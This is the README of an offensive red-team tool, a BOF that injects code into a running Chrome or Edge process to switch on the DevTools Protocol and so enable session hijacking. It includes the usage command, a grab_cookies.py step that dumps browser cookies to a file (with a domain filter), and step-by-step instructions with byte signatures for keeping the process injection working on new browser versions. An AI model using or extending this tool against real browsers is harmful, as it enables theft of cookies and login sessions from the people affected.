# CDP-Enable-BOF

`CDP-Enable-BOF` is an x64 BOF that enables the Chrome DevTools Protocol in a
running `msedge.exe` or `chrome.exe` process 

Based on [CDP-Enable](https://github.com/deathflamingo/CDP-Enabler/) and [Modern Session Hijacking by Living off the DevTools Protocol by Cedric Van Bockhaven](https://specterops.io/so-con/)

## Usage

```text
cdp_enable <edge|chrome> <9000-65535>
```

## How It Works

- finds the requested live browser process and its top-level window
- locates the loaded browser module (`msedge.dll` or `chrome.dll`)
- reads the module’s PE headers and sections from the remote process
- resolves these internal symbols at runtime using masked byte signatures:
  - `StartRemoteDebuggingServer`
  - `operator new`
  - `TCPServerSocketFactory::CreateForHttpServer`
  - `TCPServerSocketFactory` vtable
- allocates two small remote stubs plus a context block
- temporarily installs a remote window procedure
- triggers that window procedure on the browser UI thread
- calls `StartRemoteDebuggingServer` on the requested port

Running the final internal call on the browser UI thread is the key trick that
makes this reliable in the presence of CFG / TLS / CET-sensitive execution.


## Validate

Use the bundled Python script to prove CDP is up and reachable:

```powershell
python .\grab_cookies.py --port 9001 --output cookies.json
```

If CDP is working, the script will:

- resolve the browser websocket from `http://127.0.0.1:9001/json/version`
- connect to the websocket
- dump cookies to `cookies.json`

Optional domain filter:

```powershell
python .\grab_cookies.py --port 9001 --domain microsoft.com --output ms_cookies.json
```

## Common Issue

Issue: "Failed to resolve symbol signatures"

Cause: Edge version mismatch - signatures are version-specific
Solution: See "Finding New Signatures" below

Tested Chrome Version: 147.0.7727.102
Tested Edge Version: 147.0.3912.98

## Finding New Signatures

These scripts are used to find new signatures and supporting runtime inputs for
updated browser versions:

- `StartRemoteDebuggingServer`
- `operator new`
- `TCPServerSocketFactory::CreateForHttpServer`
- derived `TCPServerSocketFactory` vtable information

### Pull the DLLs

Copy the DLL from the browser build you are targeting into the working
directory. On this machine, the installed DLLs live under versioned
subdirectories:

```powershell
Copy-Item "C:\Program Files\Google\Chrome\Application\147.0.7727.138\chrome.dll" .
Copy-Item "C:\Program Files (x86)\Microsoft\Edge\Application\147.0.3912.98\msedge.dll" .
```

### Pull the matching PDBs

For Chrome:

```powershell
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com
```

For Edge:

```powershell
symchk /v /ocx edge-symchk.txt /s SRV*c:\symbols*https://msdl.microsoft.com/download/symbols .\msedge.dll
```

### Run the scripts

Find `StartRemoteDebuggingServer`:

```powershell
python .\find_start_server.py .\chrome.dll <full path to chrome.dll.pdb>
python .\find_start_server.py .\msedge.dll <full path to msedge.dll.pdb>
```

Example Edge output:

```json
{
  "binary": "C:\\Users\\antrovmp\\Desktop\\CDP-Enable-BOF\\msedge.dll",
  "pdb": "c:\\symbols\\msedge.dll.pdb\\23DB3E4A1AB4F3B44C4C44205044422E1\\msedge.dll.pdb",
  "symbol": "?StartRemoteDebuggingServer@DevToolsAgentHost@content@@SAXV?$unique_ptr@VDevToolsSocketFactory@content@@U?$default_delete@VDevToolsSocketFactory@content@@@__Cr@std@@@__Cr@std@@AEBVFilePath@base@@1W4RemoteDebuggingServerMode@12@@Z",
  "signature_rva": "0x0321EAC2",
  "signature_va": "0x000000018321EAC2",
  "signature_length": 30,
  "signature_hex": "41 57 41 56 41 54 56 57 55 53 48 83 EC 50 44 89 CD 4C 89 C3 48 89 D7 48 89 CE 48 8B 05 5D",
  "signature_c_initializer": "0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x50, 0x44, 0x89, 0xCD, 0x4C, 0x89, 0xC3, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0x5D",
  "copy_to_code": "Use this for EDGE_START_SIG if analyzing msedge.dll, or CHROME_START_SIG if analyzing chrome.dll.",
  "text_hits": 1
}
```

Copy `signature_c_initializer` into the start signature array in
`cdp_enable_bof.c`:

- Edge: `EDGE_START_SIG` at line 168
- Edge mask: `EDGE_START_MASK` at line 181
- Chrome: `CHROME_START_SIG` at line 194
- Chrome mask: `CHROME_START_MASK` at line 207

For Edge, replace the bytes in `EDGE_START_SIG` with the new
`signature_c_initializer`. For Chrome, do the same with `CHROME_START_SIG`.

Find the supporting inputs:

```powershell
python .\find_cdp_inputs.py .\chrome.dll <full path to chrome.dll.pdb>
python .\find_cdp_inputs.py .\msedge.dll <full path to msedge.dll.pdb>
```

Example Edge output:

```json
{
  "binary": "msedge.dll",
  "operator_new": {
    "rva": "0x036335D8",
    "va": "0x00000001836335D8",
    "signature": "40 53 48 83 EC 20 48 8B D9 EB ?? 48 8B CB E8 ?? ?? ?? ?? 85 C0 74 ?? 48 8B CB",
    "copy_to_code": "OPERATOR_NEW_SIG"
  },
  "tcp_server_socket_factory": {
    "create_for_http_server": {
      "rva": "0x016C7310",
      "va": "0x00000001816C7310",
      "signature_hex": "48 89 D0 0F B7 51 08 48",
      "signature_c_initializer": "0x48, 0x89, 0xD0, 0x0F, 0xB7, 0x51, 0x08, 0x48",
      "copy_to_code": "EDGE_ENTRY1_SIG",
      "vtable_rva": "0x0FBDCA70",
      "vtable_va": "0x000000018FBDCA70"
    },
    "layout": {
      "size": 16,
      "vtable_offset": 0,
      "port_offset": 8
    }
  }
}
```

Important fields and where they go:

- `operator_new.copy_to_code` -> `OPERATOR_NEW_SIG` at line 221
- `tcp_server_socket_factory.create_for_http_server.copy_to_code` ->
  `EDGE_ENTRY1_SIG` at line 242 or `CHROME_ENTRY1_SIG` at line 246
- `tcp_server_socket_factory.layout` is a sanity check for the object layout the
  BOF expects: size `16`, vtable offset `0`, port offset `8`

The script also derives the TCPServerSocketFactory vtable location. The BOF
still resolves that through the `VTABLE_ENTRY0_SIG` / `VTABLE_ENTRY0_MASK`
helper at lines 228 and 234 if that helper drifts.

## Notes

- x64 only
- tested with both `msedge.exe` and `chrome.exe`
- the BOF only targets the browser you explicitly pass as an argument
- the current Chrome resolver uses a stronger masked `CreateForHttpServer`
  signature to avoid false positives across patch-level browser changes


